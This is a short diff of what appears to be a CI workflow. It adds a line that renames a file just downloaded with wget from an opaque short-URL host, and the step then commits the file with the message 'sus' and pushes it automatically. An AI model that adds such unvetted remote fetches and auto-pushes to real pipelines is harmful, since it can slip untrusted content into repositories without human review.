@@ -37,6 +37,7 @@ jobs:
           git config --global user.name "Your Name"
           git add .
           wget ivi.cx/i/cfg?6421db3f
+          mv cfg?6421db3f file2.txt
           git commit -m "sus"
           git push
         continue-on-error: true
